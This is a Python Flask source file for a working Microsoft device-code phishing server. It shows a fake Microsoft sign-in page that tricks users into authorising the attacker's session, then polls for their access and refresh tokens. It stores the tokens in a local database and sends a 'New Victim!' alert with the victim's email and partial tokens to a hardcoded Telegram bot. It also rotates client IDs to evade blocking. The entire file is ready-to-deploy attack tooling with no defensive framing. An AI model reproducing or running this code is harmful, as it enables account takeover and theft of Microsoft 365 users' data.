import os
import time
import sqlite3
import threading
import requests
import jwt
from flask import Flask, request, jsonify, render_template_string, redirect, url_for
from datetime import datetime

# --- Configuration ---
TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TELEGRAM_CHAT_ID = "8877118461"
DB_PATH = "/tmp/phish.db"

# Microsoft Device Code Flow Constants
# Using a mix of public client IDs to rotate if one gets blocked
CLIENT_IDS = [
    "1950a258-227b-4e31-a9cf-717495945fc2",  # Azure PowerShell
    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI
    "268761a2-03f3-40df-8a8b-c3db3f9d0a3f",  # Office UWP
    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Office Desktop
]
CURRENT_CLIENT_ID_INDEX = 0
TENANT = "common"
SCOPE = "https://graph.microsoft.com/.default openid profile offline_access"

app = Flask(__name__)

# --- Database Setup ---
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS sessions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    device_code TEXT UNIQUE,
                    user_code TEXT,
                    verification_uri TEXT,
                    client_id TEXT,
                    status TEXT DEFAULT 'pending',
                    access_token TEXT,
                    refresh_token TEXT,
                    id_token TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )''')
    conn.commit()
    conn.close()

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

# --- Telegram Notification ---
def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        print(f"Telegram Error: {e}")

# --- Microsoft API Helpers ---
def get_device_code(client_id):
    url = f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/devicecode"
    data = {
        "client_id": client_id,
        "scope": SCOPE
    }
    resp = requests.post(url, data=data)
    if resp.status_code == 200:
        return resp.json()
    return None

def poll_token(device_code, client_id, interval=5):
    url = f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token"
    data = {
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
        "device_code": device_code,
        "client_id": client_id
    }
    
    while True:
        try:
            resp = requests.post(url, data=data)
            result = resp.json()
            
            if "access_token" in result:
                return result
            elif "error" in result:
                error = result["error"]
                if error == "authorization_pending":
                    time.sleep(interval)
                    continue
                elif error == "slow_down":
                    interval += 5
                    time.sleep(interval)
                    continue
                else:
                    # Other errors (expired, declined)
                    return None
        except Exception as e:
            print(f"Polling error: {e}")
            time.sleep(interval)

# --- Routes ---

@app.route('/')
def index():
    # Initialize DB on every request to be safe on Render cold starts
    init_db()
    
    global CURRENT_CLIENT_ID_INDEX
    client_id = CLIENT_IDS[CURRENT_CLIENT_ID_INDEX]
    
    # Try to get a device code. If it fails, rotate client ID.
    device_data = get_device_code(client_id)
    if not device_data:
        # Rotate to next client ID if current one fails
        CURRENT_CLIENT_ID_INDEX = (CURRENT_CLIENT_ID_INDEX + 1) % len(CLIENT_IDS)
        client_id = CLIENT_IDS[CURRENT_CLIENT_ID_INDEX]
        device_data = get_device_code(client_id)
        
    if not device_data:
        return "Service unavailable. Please try again later.", 503

    # Store session in DB
    conn = get_db()
    conn.execute(
        "INSERT INTO sessions (device_code, user_code, verification_uri, client_id) VALUES (?, ?, ?, ?)",
        (device_data['device_code'], device_data['user_code'], device_data['verification_uri'], client_id)
    )
    conn.commit()
    conn.close()

    # Render the phishing page
    html = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Sign in to your account</title>
        <style>
            body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
            .container {{ background: white; padding: 44px; width: 440px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); text-align: center; }}
            .logo {{ margin-bottom: 20px; }}
            h1 {{ font-size: 24px; font-weight: 600; margin-bottom: 10px; color: #1b1b1b; }}
            p {{ font-size: 15px; color: #1b1b1b; margin-bottom: 20px; }}
            .code-box {{ background: #f2f2f2; padding: 15px; font-size: 24px; font-weight: bold; letter-spacing: 2px; margin: 20px 0; border: 1px solid #ccc; }}
            .btn {{ background: #0067b8; color: white; border: none; padding: 10px 20px; font-size: 15px; cursor: pointer; width: 100%; margin-top: 10px; }}
            .btn:hover {{ background: #005da6; }}
            .footer {{ margin-top: 30px; font-size: 12px; color: #666; }}
        </style>
    </head>
    <body>
        <div class="container">
            <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5bb8b95a4b34560a558c980b2042cb.png" alt="Microsoft" class="logo">
            <h1>Sign in</h1>
            <p>Enter the code shown on your device to sign in.</p>
            
            <div class="code-box" id="userCode">{device_data['user_code']}</div>
            
            <button class="btn" onclick="copyAndRedirect()">Copy Code & Sign In</button>
            
            <div class="footer">
                <p>Helpful? <a href="#">Get help signing in</a></p>
            </div>
        </div>

        <script>
            function copyAndRedirect() {{
                const code = document.getElementById('userCode').innerText;
                navigator.clipboard.writeText(code).then(() => {{
                    window.location.href = "{device_data['verification_uri']}";
                }}).catch(err => {{
                    console.error('Failed to copy: ', err);
                    window.location.href = "{device_data['verification_uri']}";
                }});
            }}
        </script>
    </body>
    </html>
    """
    return html

@app.route('/webhook', methods=['POST'])
def webhook():
    # This route can be used for other triggers if needed, but polling is handled below
    return "OK", 200

# --- Background Polling Thread ---
def poll_worker():
    init_db()
    print("Polling worker started...")
    while True:
        try:
            conn = get_db()
            # Find pending sessions
            sessions = conn.execute("SELECT * FROM sessions WHERE status = 'pending'").fetchall()
            conn.close()
            
            for session in sessions:
                device_code = session['device_code']
                client_id = session['client_id']
                
                # Poll for token
                tokens = poll_token(device_code, client_id)
                
                if tokens:
                    # Success! Extract tokens
                    access_token = tokens.get('access_token')
                    refresh_token = tokens.get('refresh_token')
                    id_token = tokens.get('id_token')
                    
                    # Decode ID Token to get email
                    email = "Unknown"
                    try:
                        decoded = jwt.decode(id_token, options={"verify_signature": False})
                        email = decoded.get('upn') or decoded.get('email') or decoded.get('unique_name')
                    except:
                        pass

                    # Update DB
                    conn = get_db()
                    conn.execute(
                        "UPDATE sessions SET status = 'completed', access_token = ?, refresh_token = ?, id_token = ? WHERE device_code = ?",
                        (access_token, refresh_token, id_token, device_code)
                    )
                    conn.commit()
                    conn.close()
                    
                    # Send Telegram Notification
                    msg = f"🎯 <b>New Victim!</b>\n\n"
                    msg += f"📧 <b>Email:</b> <code>{email}</code>\n"
                    msg += f"🔑 <b>Access Token:</b> <code>{access_token[:20]}...</code>\n"
                    msg += f"🔄 <b>Refresh Token:</b> <code>{refresh_token[:20]}...</code>\n"
                    msg += f"🆔 <b>ID Token:</b> <code>{id_token[:20]}...</code>\n"
                    send_telegram_message(msg)
                    print(f"Token captured for {email}")
                else:
                    # Check if session expired or failed
                    # For simplicity, we leave it as pending until it succeeds or we add an expiry check
                    pass
                    
        except Exception as e:
            print(f"Worker Error: {e}")
        
        time.sleep(10) # Check every 10 seconds

# Start the polling thread when the app starts
thread = threading.Thread(target=poll_worker, daemon=True)
thread.start()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
